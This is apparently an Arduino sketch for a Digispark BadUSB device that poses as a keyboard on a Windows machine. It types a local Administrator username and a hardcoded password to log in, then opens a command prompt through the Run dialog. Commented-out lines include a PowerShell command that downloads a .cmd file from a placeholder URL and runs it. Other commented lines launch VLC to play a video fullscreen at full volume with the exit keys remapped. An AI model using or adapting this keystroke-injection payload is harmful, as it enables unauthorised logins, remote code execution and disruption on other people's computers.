//This the important part, include the De suffixed version instead of the normal one and the rest goes same as the original lib.
#include "DigiKeyboardDe.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
   DigiKeyboardDe.println(".\\Administrator");
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
 DigiKeyboardDe.println("01219dd.");
    DigiKeyboard.delay(2000);

 // DigiKeyboardDe.println("Hello XYZ !\"§$%&/()=? [] {}!");
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
 DigiKeyboardDe.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
 DigiKeyboard.delay(1000);
  
 DigiKeyboardDe.println("cmd");
 DigiKeyboard.delay(1000);
 //DigiKeyboardDe.println("\"%ProgramFiles%\\VideoLAN\\VLC\\vlc.exe\" --fullscreen --no-video-title-show --no-embedded-video --no-qt-fs-controller --qt-start-minimized --qt-system-tray --video-wallpaper --volume 1024 --quiet --video-on-top --mouse-hide-timeout=1  --key-vol-up=Esc --repeat https://www.youtube.com/watch?v=lNk_n8YdF9o ");
//DigiKeyboardDe.print(F("powershell wget http://<URL-TO-CMD-FILE-ON-INTERNET> -OutFile $env:temp/r1.cmd && start %temp%/r1.cmd && exit"));
//DigiKeyboardDe.print(F("\"%ProgramFiles%\\VideoLAN\\VLC\\vlc.exe\" --fullscreen --no-video-title-show --no-embedded-video --no-qt-fs-controller --qt-start-minimized --qt-system-tray --video-wallpaper --volume 1024 --quiet --video-on-top --mouse-hide-timeout=1  --key-vol-up=Esc --key-vol-up 'Esc' --repeat https://vimeo.com/773479847 "));
 //DigiKeyboardDe.println(F("\"%ProgramFiles%\\VideoLAN\\VLC\\vlc.exe\"  --fullscreen --no-video-title-show --no-embedded-video --no-qt-fs-controller --qt-start-minimized --qt-system-tray --video-wallpaper --volume 1024 --quiet --video-on-top --mouse-hide-timeout=0 --repeat --key-vol-up Esc --key-leave-fullscreen 'Ctrl-c' --key-rate-faster-fine f --key-leave-fullscreen 'Ctrl-q' https://github.com/alafad/misc/raw/main/king_cheems.avi "));




 //DigiKeyboardDe.println(F("set command=\" --fullscreen --no-video-title-show --no-embedded-video --no-qt-fs-controller --qt-start-minimized --qt-system-tray --video-wallpaper --volume 1024 --quiet --video-on-top --mouse-hide-timeout=0 --repeat --key-vol-up Esc --key-leave-fullscreen 'Ctrl-c' --key-rate-faster-fine f --key-leave-fullscreen 'Ctrl-q' --key-rate-slower-fine Space  --key-play-pause 'Ctrl-1'  https://github.com/alafad/misc/raw/main/king_cheems.avi "));
 //DigiKeyboardDe.println(F(" \"%ProgramFiles%\\VideoLAN\\VLC\\vlc.exe\ %command% || \"%ProgramFiles(x86)%\\VideoLAN\\VLC\\vlc.exe  %command% "));

 DigiKeyboard.delay(5000000000000000);
}